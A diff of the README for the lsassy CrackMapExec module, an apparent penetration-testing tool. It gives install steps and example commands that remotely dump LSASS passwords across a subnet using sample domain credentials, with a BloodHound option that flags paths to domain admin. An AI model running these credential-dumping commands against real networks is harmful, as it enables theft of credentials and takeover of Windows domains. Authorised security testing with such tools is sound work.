@@ -1,16 +1,34 @@
-## Installation
+# Lsassy CrackMapExec Module
 
-* Copy `lsassy.py` in `[CME Path]/cme/modules`
-* Reinstall CrackMapExec `python setup.py install`
+This CME module uses **lsassy** to remotely extract lsass password, and optionnaly interacts with Bloodhound to **set compromised hosts as owned** and check if compromised users have a **path to domain admin**.
+
+![CME Module example](/assets/cme_lsassy.gif)
 
 ## Requirements
 
-* [lsassy](https://github.com/Hackndo/lsassy/)
+* Python2.7
+  - [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
+* Python3.6+
+  - [lsassy](https://github.com/Hackndo/lsassy/)
+
+
+## Installation
+
+* Copy `lsassy.py` in `[CrackMapExec Path]/cme/modules`
+* Reinstall CrackMapExec using python2.7 `python setup.py install`
 
 ## Usage
 
 ```bash
 cme smb 10.10.0.0/24 -d adsec.local -u jsnow -p Winter_is_coming_\! -M lsassy
+```
+
+You can set BloodHound integration using `-o BLOODHOUND=True` flag. This flag enables differents checks :
+* Set "owned" on BloodHound computer nodes that are compromised
+* Detect compromised users that have a **path to domain admin**
+
+```bash
+cme smb 10.10.0.0/24 -d adsec.local -u jsnow -p Winter_is_coming_\! -M lsassy -o BLOODHOUND=True
 ```
 
 You can check available options using
@@ -36,18 +54,5 @@ Options can be set using
 ```bash
 cme smb dc01.adsec.local -d adsec.local -u jsnow -p Winter_is_coming_\! -M lsassy -o PROCDUMP_PATH='/home/pixis/Tools/' PROCDUMP_EXE_NAME='procdump.exe'
 ```
-
-## BloodHound integration
-
-BloodHound additional information can be obtained. `BLOODHOUND` option may be switched to enable this functionality.
-
-* Set "owned" on BloodHound computer nodes that are compromised
-* Detect compromised users that have a path to domain admin
-
-```bash
-cme smb dc01.adsec.local -d adsec.local -u jsnow -p Winter_is_coming_\! -M lsassy -o BLOODHOUND=True
-```
-
-![CME Module example](/assets/cme_lsassy.gif)
 
 Have fun
